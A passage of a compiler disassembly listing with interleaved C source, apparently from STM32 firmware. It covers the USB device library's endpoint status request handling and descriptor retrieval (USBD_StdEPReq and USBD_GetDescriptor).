 800badc:	2b00      	cmp	r3, #0
 800bade:	d010      	beq.n	800bb02 <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800bae0:	7b7a      	ldrb	r2, [r7, #13]
 800bae2:	687b      	ldr	r3, [r7, #4]
 800bae4:	32ae      	adds	r2, #174	; 0xae
 800bae6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800baea:	689b      	ldr	r3, [r3, #8]
 800baec:	6839      	ldr	r1, [r7, #0]
 800baee:	6878      	ldr	r0, [r7, #4]
 800baf0:	4798      	blx	r3
 800baf2:	4603      	mov	r3, r0
 800baf4:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800baf6:	e004      	b.n	800bb02 <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
 800baf8:	6839      	ldr	r1, [r7, #0]
 800bafa:	6878      	ldr	r0, [r7, #4]
 800bafc:	f000 fc2d 	bl	800c35a <USBD_CtlError>
              break;
 800bb00:	e000      	b.n	800bb04 <USBD_StdEPReq+0x1c8>
              break;
 800bb02:	bf00      	nop
          }
          break;
 800bb04:	e0ab      	b.n	800bc5e <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800bb06:	687b      	ldr	r3, [r7, #4]
 800bb08:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bb0c:	b2db      	uxtb	r3, r3
 800bb0e:	2b02      	cmp	r3, #2
 800bb10:	d002      	beq.n	800bb18 <USBD_StdEPReq+0x1dc>
 800bb12:	2b03      	cmp	r3, #3
 800bb14:	d032      	beq.n	800bb7c <USBD_StdEPReq+0x240>
 800bb16:	e097      	b.n	800bc48 <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800bb18:	7bbb      	ldrb	r3, [r7, #14]
 800bb1a:	2b00      	cmp	r3, #0
 800bb1c:	d007      	beq.n	800bb2e <USBD_StdEPReq+0x1f2>
 800bb1e:	7bbb      	ldrb	r3, [r7, #14]
 800bb20:	2b80      	cmp	r3, #128	; 0x80
 800bb22:	d004      	beq.n	800bb2e <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800bb24:	6839      	ldr	r1, [r7, #0]
 800bb26:	6878      	ldr	r0, [r7, #4]
 800bb28:	f000 fc17 	bl	800c35a <USBD_CtlError>
                break;
 800bb2c:	e091      	b.n	800bc52 <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bb2e:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bb32:	2b00      	cmp	r3, #0
 800bb34:	da0b      	bge.n	800bb4e <USBD_StdEPReq+0x212>
 800bb36:	7bbb      	ldrb	r3, [r7, #14]
 800bb38:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800bb3c:	4613      	mov	r3, r2
 800bb3e:	009b      	lsls	r3, r3, #2
 800bb40:	4413      	add	r3, r2
 800bb42:	009b      	lsls	r3, r3, #2
 800bb44:	3310      	adds	r3, #16
 800bb46:	687a      	ldr	r2, [r7, #4]
 800bb48:	4413      	add	r3, r2
 800bb4a:	3304      	adds	r3, #4
 800bb4c:	e00b      	b.n	800bb66 <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800bb4e:	7bbb      	ldrb	r3, [r7, #14]
 800bb50:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bb54:	4613      	mov	r3, r2
 800bb56:	009b      	lsls	r3, r3, #2
 800bb58:	4413      	add	r3, r2
 800bb5a:	009b      	lsls	r3, r3, #2
 800bb5c:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800bb60:	687a      	ldr	r2, [r7, #4]
 800bb62:	4413      	add	r3, r2
 800bb64:	3304      	adds	r3, #4
 800bb66:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800bb68:	68bb      	ldr	r3, [r7, #8]
 800bb6a:	2200      	movs	r2, #0
 800bb6c:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800bb6e:	68bb      	ldr	r3, [r7, #8]
 800bb70:	2202      	movs	r2, #2
 800bb72:	4619      	mov	r1, r3
 800bb74:	6878      	ldr	r0, [r7, #4]
 800bb76:	f000 fc61 	bl	800c43c <USBD_CtlSendData>
              break;
 800bb7a:	e06a      	b.n	800bc52 <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800bb7c:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bb80:	2b00      	cmp	r3, #0
 800bb82:	da11      	bge.n	800bba8 <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800bb84:	7bbb      	ldrb	r3, [r7, #14]
 800bb86:	f003 020f 	and.w	r2, r3, #15
 800bb8a:	6879      	ldr	r1, [r7, #4]
 800bb8c:	4613      	mov	r3, r2
 800bb8e:	009b      	lsls	r3, r3, #2
 800bb90:	4413      	add	r3, r2
 800bb92:	009b      	lsls	r3, r3, #2
 800bb94:	440b      	add	r3, r1
 800bb96:	3324      	adds	r3, #36	; 0x24
 800bb98:	881b      	ldrh	r3, [r3, #0]
 800bb9a:	2b00      	cmp	r3, #0
 800bb9c:	d117      	bne.n	800bbce <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800bb9e:	6839      	ldr	r1, [r7, #0]
 800bba0:	6878      	ldr	r0, [r7, #4]
 800bba2:	f000 fbda 	bl	800c35a <USBD_CtlError>
                  break;
 800bba6:	e054      	b.n	800bc52 <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800bba8:	7bbb      	ldrb	r3, [r7, #14]
 800bbaa:	f003 020f 	and.w	r2, r3, #15
 800bbae:	6879      	ldr	r1, [r7, #4]
 800bbb0:	4613      	mov	r3, r2
 800bbb2:	009b      	lsls	r3, r3, #2
 800bbb4:	4413      	add	r3, r2
 800bbb6:	009b      	lsls	r3, r3, #2
 800bbb8:	440b      	add	r3, r1
 800bbba:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800bbbe:	881b      	ldrh	r3, [r3, #0]
 800bbc0:	2b00      	cmp	r3, #0
 800bbc2:	d104      	bne.n	800bbce <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800bbc4:	6839      	ldr	r1, [r7, #0]
 800bbc6:	6878      	ldr	r0, [r7, #4]
 800bbc8:	f000 fbc7 	bl	800c35a <USBD_CtlError>
                  break;
 800bbcc:	e041      	b.n	800bc52 <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bbce:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800bbd2:	2b00      	cmp	r3, #0
 800bbd4:	da0b      	bge.n	800bbee <USBD_StdEPReq+0x2b2>
 800bbd6:	7bbb      	ldrb	r3, [r7, #14]
 800bbd8:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800bbdc:	4613      	mov	r3, r2
 800bbde:	009b      	lsls	r3, r3, #2
 800bbe0:	4413      	add	r3, r2
 800bbe2:	009b      	lsls	r3, r3, #2
 800bbe4:	3310      	adds	r3, #16
 800bbe6:	687a      	ldr	r2, [r7, #4]
 800bbe8:	4413      	add	r3, r2
 800bbea:	3304      	adds	r3, #4
 800bbec:	e00b      	b.n	800bc06 <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800bbee:	7bbb      	ldrb	r3, [r7, #14]
 800bbf0:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800bbf4:	4613      	mov	r3, r2
 800bbf6:	009b      	lsls	r3, r3, #2
 800bbf8:	4413      	add	r3, r2
 800bbfa:	009b      	lsls	r3, r3, #2
 800bbfc:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800bc00:	687a      	ldr	r2, [r7, #4]
 800bc02:	4413      	add	r3, r2
 800bc04:	3304      	adds	r3, #4
 800bc06:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800bc08:	7bbb      	ldrb	r3, [r7, #14]
 800bc0a:	2b00      	cmp	r3, #0
 800bc0c:	d002      	beq.n	800bc14 <USBD_StdEPReq+0x2d8>
 800bc0e:	7bbb      	ldrb	r3, [r7, #14]
 800bc10:	2b80      	cmp	r3, #128	; 0x80
 800bc12:	d103      	bne.n	800bc1c <USBD_StdEPReq+0x2e0>
              {
                pep->status = 0x0000U;
 800bc14:	68bb      	ldr	r3, [r7, #8]
 800bc16:	2200      	movs	r2, #0
 800bc18:	601a      	str	r2, [r3, #0]
 800bc1a:	e00e      	b.n	800bc3a <USBD_StdEPReq+0x2fe>
              }
              else if (USBD_LL_IsStallEP(pdev, ep_addr) != 0U)
 800bc1c:	7bbb      	ldrb	r3, [r7, #14]
 800bc1e:	4619      	mov	r1, r3
 800bc20:	6878      	ldr	r0, [r7, #4]
 800bc22:	f001 f979 	bl	800cf18 <USBD_LL_IsStallEP>
 800bc26:	4603      	mov	r3, r0
 800bc28:	2b00      	cmp	r3, #0
 800bc2a:	d003      	beq.n	800bc34 <USBD_StdEPReq+0x2f8>
              {
                pep->status = 0x0001U;
 800bc2c:	68bb      	ldr	r3, [r7, #8]
 800bc2e:	2201      	movs	r2, #1
 800bc30:	601a      	str	r2, [r3, #0]
 800bc32:	e002      	b.n	800bc3a <USBD_StdEPReq+0x2fe>
              }
              else
              {
                pep->status = 0x0000U;
 800bc34:	68bb      	ldr	r3, [r7, #8]
 800bc36:	2200      	movs	r2, #0
 800bc38:	601a      	str	r2, [r3, #0]
              }

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800bc3a:	68bb      	ldr	r3, [r7, #8]
 800bc3c:	2202      	movs	r2, #2
 800bc3e:	4619      	mov	r1, r3
 800bc40:	6878      	ldr	r0, [r7, #4]
 800bc42:	f000 fbfb 	bl	800c43c <USBD_CtlSendData>
              break;
 800bc46:	e004      	b.n	800bc52 <USBD_StdEPReq+0x316>

            default:
              USBD_CtlError(pdev, req);
 800bc48:	6839      	ldr	r1, [r7, #0]
 800bc4a:	6878      	ldr	r0, [r7, #4]
 800bc4c:	f000 fb85 	bl	800c35a <USBD_CtlError>
              break;
 800bc50:	bf00      	nop
          }
          break;
 800bc52:	e004      	b.n	800bc5e <USBD_StdEPReq+0x322>

        default:
          USBD_CtlError(pdev, req);
 800bc54:	6839      	ldr	r1, [r7, #0]
 800bc56:	6878      	ldr	r0, [r7, #4]
 800bc58:	f000 fb7f 	bl	800c35a <USBD_CtlError>
          break;
 800bc5c:	bf00      	nop
      }
      break;
 800bc5e:	e005      	b.n	800bc6c <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800bc60:	6839      	ldr	r1, [r7, #0]
 800bc62:	6878      	ldr	r0, [r7, #4]
 800bc64:	f000 fb79 	bl	800c35a <USBD_CtlError>
      break;
 800bc68:	e000      	b.n	800bc6c <USBD_StdEPReq+0x330>
      break;
 800bc6a:	bf00      	nop
  }

  return ret;
 800bc6c:	7bfb      	ldrb	r3, [r7, #15]
}
 800bc6e:	4618      	mov	r0, r3
 800bc70:	3710      	adds	r7, #16
 800bc72:	46bd      	mov	sp, r7
 800bc74:	bd80      	pop	{r7, pc}
	...

0800bc78 <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bc78:	b580      	push	{r7, lr}
 800bc7a:	b084      	sub	sp, #16
 800bc7c:	af00      	add	r7, sp, #0
 800bc7e:	6078      	str	r0, [r7, #4]
 800bc80:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800bc82:	2300      	movs	r3, #0
 800bc84:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
 800bc86:	2300      	movs	r3, #0
 800bc88:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800bc8a:	2300      	movs	r3, #0
 800bc8c:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800bc8e:	683b      	ldr	r3, [r7, #0]
 800bc90:	885b      	ldrh	r3, [r3, #2]
 800bc92:	0a1b      	lsrs	r3, r3, #8
 800bc94:	b29b      	uxth	r3, r3
 800bc96:	3b01      	subs	r3, #1
 800bc98:	2b0e      	cmp	r3, #14
 800bc9a:	f200 8152 	bhi.w	800bf42 <USBD_GetDescriptor+0x2ca>
 800bc9e:	a201      	add	r2, pc, #4	; (adr r2, 800bca4 <USBD_GetDescriptor+0x2c>)
 800bca0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bca4:	0800bd15 	.word	0x0800bd15
 800bca8:	0800bd2d 	.word	0x0800bd2d
 800bcac:	0800bd6d 	.word	0x0800bd6d
 800bcb0:	0800bf43 	.word	0x0800bf43
 800bcb4:	0800bf43 	.word	0x0800bf43
 800bcb8:	0800bee3 	.word	0x0800bee3
 800bcbc:	0800bf0f 	.word	0x0800bf0f
 800bcc0:	0800bf43 	.word	0x0800bf43
 800bcc4:	0800bf43 	.word	0x0800bf43
 800bcc8:	0800bf43 	.word	0x0800bf43
 800bccc:	0800bf43 	.word	0x0800bf43
 800bcd0:	0800bf43 	.word	0x0800bf43
 800bcd4:	0800bf43 	.word	0x0800bf43
 800bcd8:	0800bf43 	.word	0x0800bf43
 800bcdc:	0800bce1 	.word	0x0800bce1
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800bce0:	687b      	ldr	r3, [r7, #4]
 800bce2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bce6:	69db      	ldr	r3, [r3, #28]
 800bce8:	2b00      	cmp	r3, #0
 800bcea:	d00b      	beq.n	800bd04 <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800bcec:	687b      	ldr	r3, [r7, #4]
 800bcee:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcf2:	69db      	ldr	r3, [r3, #28]
 800bcf4:	687a      	ldr	r2, [r7, #4]
 800bcf6:	7c12      	ldrb	r2, [r2, #16]
 800bcf8:	f107 0108 	add.w	r1, r7, #8
 800bcfc:	4610      	mov	r0, r2
 800bcfe:	4798      	blx	r3
 800bd00:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd02:	e126      	b.n	800bf52 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd04:	6839      	ldr	r1, [r7, #0]
 800bd06:	6878      	ldr	r0, [r7, #4]
 800bd08:	f000 fb27 	bl	800c35a <USBD_CtlError>
        err++;
 800bd0c:	7afb      	ldrb	r3, [r7, #11]
 800bd0e:	3301      	adds	r3, #1
 800bd10:	72fb      	strb	r3, [r7, #11]
      break;
 800bd12:	e11e      	b.n	800bf52 <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800bd14:	687b      	ldr	r3, [r7, #4]
 800bd16:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd1a:	681b      	ldr	r3, [r3, #0]
 800bd1c:	687a      	ldr	r2, [r7, #4]
 800bd1e:	7c12      	ldrb	r2, [r2, #16]
 800bd20:	f107 0108 	add.w	r1, r7, #8
 800bd24:	4610      	mov	r0, r2
 800bd26:	4798      	blx	r3
 800bd28:	60f8      	str	r0, [r7, #12]
      break;
 800bd2a:	e112      	b.n	800bf52 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd2c:	687b      	ldr	r3, [r7, #4]
 800bd2e:	7c1b      	ldrb	r3, [r3, #16]
 800bd30:	2b00      	cmp	r3, #0
 800bd32:	d10d      	bne.n	800bd50 <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800bd34:	687b      	ldr	r3, [r7, #4]
 800bd36:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd3a:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bd3c:	f107 0208 	add.w	r2, r7, #8
 800bd40:	4610      	mov	r0, r2
 800bd42:	4798      	blx	r3
 800bd44:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bd46:	68fb      	ldr	r3, [r7, #12]
 800bd48:	3301      	adds	r3, #1
 800bd4a:	2202      	movs	r2, #2
 800bd4c:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800bd4e:	e100      	b.n	800bf52 <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800bd50:	687b      	ldr	r3, [r7, #4]
 800bd52:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd56:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800bd58:	f107 0208 	add.w	r2, r7, #8
 800bd5c:	4610      	mov	r0, r2
 800bd5e:	4798      	blx	r3
 800bd60:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bd62:	68fb      	ldr	r3, [r7, #12]
 800bd64:	3301      	adds	r3, #1
 800bd66:	2202      	movs	r2, #2
 800bd68:	701a      	strb	r2, [r3, #0]
      break;
 800bd6a:	e0f2      	b.n	800bf52 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800bd6c:	683b      	ldr	r3, [r7, #0]
 800bd6e:	885b      	ldrh	r3, [r3, #2]
 800bd70:	b2db      	uxtb	r3, r3
 800bd72:	2b05      	cmp	r3, #5
 800bd74:	f200 80ac 	bhi.w	800bed0 <USBD_GetDescriptor+0x258>
 800bd78:	a201      	add	r2, pc, #4	; (adr r2, 800bd80 <USBD_GetDescriptor+0x108>)
 800bd7a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bd7e:	bf00      	nop
 800bd80:	0800bd99 	.word	0x0800bd99
 800bd84:	0800bdcd 	.word	0x0800bdcd
 800bd88:	0800be01 	.word	0x0800be01
 800bd8c:	0800be35 	.word	0x0800be35
 800bd90:	0800be69 	.word	0x0800be69
 800bd94:	0800be9d 	.word	0x0800be9d
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800bd98:	687b      	ldr	r3, [r7, #4]
 800bd9a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bd9e:	685b      	ldr	r3, [r3, #4]
 800bda0:	2b00      	cmp	r3, #0
 800bda2:	d00b      	beq.n	800bdbc <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800bda4:	687b      	ldr	r3, [r7, #4]
 800bda6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bdaa:	685b      	ldr	r3, [r3, #4]
 800bdac:	687a      	ldr	r2, [r7, #4]
 800bdae:	7c12      	ldrb	r2, [r2, #16]
 800bdb0:	f107 0108 	add.w	r1, r7, #8
 800bdb4:	4610      	mov	r0, r2
 800bdb6:	4798      	blx	r3
 800bdb8:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bdba:	e091      	b.n	800bee0 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bdbc:	6839      	ldr	r1, [r7, #0]
 800bdbe:	6878      	ldr	r0, [r7, #4]
 800bdc0:	f000 facb 	bl	800c35a <USBD_CtlError>
            err++;
 800bdc4:	7afb      	ldrb	r3, [r7, #11]
 800bdc6:	3301      	adds	r3, #1
 800bdc8:	72fb      	strb	r3, [r7, #11]
          break;
 800bdca:	e089      	b.n	800bee0 <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800bdcc:	687b      	ldr	r3, [r7, #4]
 800bdce:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bdd2:	689b      	ldr	r3, [r3, #8]
 800bdd4:	2b00      	cmp	r3, #0
 800bdd6:	d00b      	beq.n	800bdf0 <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800bdd8:	687b      	ldr	r3, [r7, #4]
 800bdda:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bdde:	689b      	ldr	r3, [r3, #8]
 800bde0:	687a      	ldr	r2, [r7, #4]
 800bde2:	7c12      	ldrb	r2, [r2, #16]
 800bde4:	f107 0108 	add.w	r1, r7, #8
 800bde8:	4610      	mov	r0, r2
 800bdea:	4798      	blx	r3
 800bdec:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bdee:	e077      	b.n	800bee0 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bdf0:	6839      	ldr	r1, [r7, #0]
 800bdf2:	6878      	ldr	r0, [r7, #4]
 800bdf4:	f000 fab1 	bl	800c35a <USBD_CtlError>
            err++;
 800bdf8:	7afb      	ldrb	r3, [r7, #11]
 800bdfa:	3301      	adds	r3, #1
 800bdfc:	72fb      	strb	r3, [r7, #11]
          break;
 800bdfe:	e06f      	b.n	800bee0 <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800be00:	687b      	ldr	r3, [r7, #4]
 800be02:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be06:	68db      	ldr	r3, [r3, #12]
 800be08:	2b00      	cmp	r3, #0
 800be0a:	d00b      	beq.n	800be24 <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800be0c:	687b      	ldr	r3, [r7, #4]
 800be0e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be12:	68db      	ldr	r3, [r3, #12]
 800be14:	687a      	ldr	r2, [r7, #4]
 800be16:	7c12      	ldrb	r2, [r2, #16]
 800be18:	f107 0108 	add.w	r1, r7, #8
 800be1c:	4610      	mov	r0, r2
 800be1e:	4798      	blx	r3
 800be20:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800be22:	e05d      	b.n	800bee0 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800be24:	6839      	ldr	r1, [r7, #0]
 800be26:	6878      	ldr	r0, [r7, #4]
 800be28:	f000 fa97 	bl	800c35a <USBD_CtlError>
            err++;
 800be2c:	7afb      	ldrb	r3, [r7, #11]
 800be2e:	3301      	adds	r3, #1
 800be30:	72fb      	strb	r3, [r7, #11]
          break;
 800be32:	e055      	b.n	800bee0 <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800be34:	687b      	ldr	r3, [r7, #4]
 800be36:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be3a:	691b      	ldr	r3, [r3, #16]
 800be3c:	2b00      	cmp	r3, #0
 800be3e:	d00b      	beq.n	800be58 <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800be40:	687b      	ldr	r3, [r7, #4]
 800be42:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be46:	691b      	ldr	r3, [r3, #16]
 800be48:	687a      	ldr	r2, [r7, #4]
 800be4a:	7c12      	ldrb	r2, [r2, #16]
 800be4c:	f107 0108 	add.w	r1, r7, #8
 800be50:	4610      	mov	r0, r2
 800be52:	4798      	blx	r3
 800be54:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800be56:	e043      	b.n	800bee0 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800be58:	6839      	ldr	r1, [r7, #0]
 800be5a:	6878      	ldr	r0, [r7, #4]
 800be5c:	f000 fa7d 	bl	800c35a <USBD_CtlError>
            err++;
 800be60:	7afb      	ldrb	r3, [r7, #11]
 800be62:	3301      	adds	r3, #1
 800be64:	72fb      	strb	r3, [r7, #11]
          break;
 800be66:	e03b      	b.n	800bee0 <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800be68:	687b      	ldr	r3, [r7, #4]
 800be6a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be6e:	695b      	ldr	r3, [r3, #20]
 800be70:	2b00      	cmp	r3, #0
 800be72:	d00b      	beq.n	800be8c <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800be74:	687b      	ldr	r3, [r7, #4]
 800be76:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800be7a:	695b      	ldr	r3, [r3, #20]
 800be7c:	687a      	ldr	r2, [r7, #4]
 800be7e:	7c12      	ldrb	r2, [r2, #16]
 800be80:	f107 0108 	add.w	r1, r7, #8
 800be84:	4610      	mov	r0, r2
 800be86:	4798      	blx	r3
 800be88:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800be8a:	e029      	b.n	800bee0 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800be8c:	6839      	ldr	r1, [r7, #0]
 800be8e:	6878      	ldr	r0, [r7, #4]
 800be90:	f000 fa63 	bl	800c35a <USBD_CtlError>
            err++;
 800be94:	7afb      	ldrb	r3, [r7, #11]
 800be96:	3301      	adds	r3, #1
 800be98:	72fb      	strb	r3, [r7, #11]
          break;
 800be9a:	e021      	b.n	800bee0 <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800be9c:	687b      	ldr	r3, [r7, #4]
 800be9e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bea2:	699b      	ldr	r3, [r3, #24]
 800bea4:	2b00      	cmp	r3, #0
 800bea6:	d00b      	beq.n	800bec0 <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800bea8:	687b      	ldr	r3, [r7, #4]
 800beaa:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800beae:	699b      	ldr	r3, [r3, #24]
 800beb0:	687a      	ldr	r2, [r7, #4]
 800beb2:	7c12      	ldrb	r2, [r2, #16]
 800beb4:	f107 0108 	add.w	r1, r7, #8
 800beb8:	4610      	mov	r0, r2
 800beba:	4798      	blx	r3
 800bebc:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bebe:	e00f      	b.n	800bee0 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bec0:	6839      	ldr	r1, [r7, #0]
 800bec2:	6878      	ldr	r0, [r7, #4]
 800bec4:	f000 fa49 	bl	800c35a <USBD_CtlError>
            err++;
 800bec8:	7afb      	ldrb	r3, [r7, #11]
 800beca:	3301      	adds	r3, #1
 800becc:	72fb      	strb	r3, [r7, #11]
          break;
 800bece:	e007      	b.n	800bee0 <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bed0:	6839      	ldr	r1, [r7, #0]
 800bed2:	6878      	ldr	r0, [r7, #4]
 800bed4:	f000 fa41 	bl	800c35a <USBD_CtlError>
          err++;
 800bed8:	7afb      	ldrb	r3, [r7, #11]
 800beda:	3301      	adds	r3, #1
 800bedc:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800bede:	bf00      	nop
      }
      break;
 800bee0:	e037      	b.n	800bf52 <USBD_GetDescriptor+0x2da>

